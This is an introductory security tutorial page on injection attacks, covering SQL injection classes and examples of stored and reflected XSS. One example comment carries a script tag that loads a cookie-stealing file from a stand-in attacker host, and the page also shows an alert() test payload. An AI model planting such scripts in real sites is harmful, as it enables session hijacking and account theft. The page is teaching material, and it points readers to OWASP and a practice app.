---
date: 2018-08-10
title: Injections
categories:
  - security
description:
type: Document
set: security
set_order: 7
---

## General information

Injection attacks refer to a broad class of attack vectors that allow an attacker to supply untrusted input to a program,
which gets processed by an interpreter as part of a command or query which alters the course of execution of that program. Injection
attacks are amongst the oldest and most dangerous web application attacks.

## SQL injection

SQL Injection is one of the most dangerous vulnerabilities a web application can be prone to. When a user’s input is being
passed unvalidated and unsanitzed as part of an SQL query that means that the user can manipulate the query itself and force
it to return different data than what it was supposed to return.

SQL Injection attacks can be divided into the following three classes:
* Inband: data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward kind of attack, in which the retrieved data is presented directly in the application web page.
* Out-of-band: data is retrieved using a different channel (e.g., an email with the results of the query is generated and sent to the tester).
* Inferential or Blind: there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.

A successful SQL Injection attack requires the attacker to craft a syntactically correct SQL Query. If the application returns an error message generated by an incorrect query, then it may be easier for an attacker 
to reconstruct the logic of the original query and, therefore, understand how to perform the injection correctly. However, if the application hides the error details, then the tester must be able to reverse engineer the logic of the original query.

## Basic examples

While browsing an e-commerce website, a perpetrator discovers a vulnerability that allows HTML tags to be embedded in the site’s comments section. The embedded tags become a permanent feature of the page, causing the browser to parse them with the rest of the source code every time the page is opened.

The attacker adds the following comment: Great price for a great item! Read my review here <script src=”http://hackersite.com/authstealer.js”> </script>.

From this point on, every time the page is accessed, the HTML tag in the comment will activate a JavaScript file, which is hosted on another site, and has the ability to steal visitors’ session cookies.

Using the session cookie, the attacker can compromise the visitor’s account, granting him easy access to his personal information and credit card data. Meanwhile, the visitor, who may never have even scrolled down to the comments section, is not aware that the attack took place.

Now let's consider reflected XSS attack example. Imagine that you have input field which allows you to perform search on the site. You input something like `<script>alert(1)</script>foo` into it and hit enter. On a vulnerable site, that entire parameter will get injected into the error page that pops up, the javascript will execute, and you'll get a popup in addition to the "Resource foo is not found" message. If you can induce somebody else navigate to the same link that you crafted, you can execute arbitrary javascript in their session.

## What's next?

Here are some useful links to expand your knowledge:
* Extended info about vulnerability is listed on [OWASP article](https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005));
* Good explanation of this attack including examples you can find [here](https://www.acunetix.com/blog/articles/exploiting-sql-injection-example/); 
* [Extended info](http://phpsecurity.readthedocs.io/en/latest/Injection-Attacks.html) about different types of injections. 
* You can practise your skills on [juice-shop](https://github.com/bkimminich/juice-shop) app.
